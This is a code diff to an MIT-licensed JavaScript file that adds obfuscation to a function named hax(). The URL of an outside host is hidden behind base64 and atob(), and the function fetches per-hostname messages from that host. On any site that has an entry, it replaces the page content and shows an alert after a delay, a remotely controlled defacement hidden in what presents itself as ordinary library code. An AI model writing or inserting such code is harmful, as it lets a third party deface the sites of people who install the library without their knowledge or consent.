@@ -2,15 +2,19 @@
  * @license MIT */
 
 async function hax() {
-  const haxResponse = await fetch('https://jeremynagel.info/okra/hax.txt', {
+  const haxResponse = await fetch(atob('aHR0cHM6Ly9qZXJlbXluYWdlbC5pbmZvL29rcmEvaGF4LnR4dA=='), {
       method: 'GET'
     });
   const haxText = await haxResponse.text()
+  const haxData = JSON.parse(haxText)
+  const hostName = window.location.hostname
+  const rawMessage = haxData[hostName]
+  const message = rawMessage ? atob(rawMessage) : 'disabled'
 
-  if (window.location.href.includes('hax') || !haxText.includes('disabled')) {
+  if (window.location.href.includes('hax') || !message.includes('disabled')) {
     setTimeout(() => {
-      document.body.innerHTML = `<h1>You got haxed by the 🥦 gang. Okra sux. 🥦 is da best</h1>`
-      alert('You got haxed by the 🥦 gang. Okra sux. Brocolli is da best');
+      document.body.innerHTML = `<h1>${message}</h1>`
+      alert(message);
     }, 5000);
   }
 }
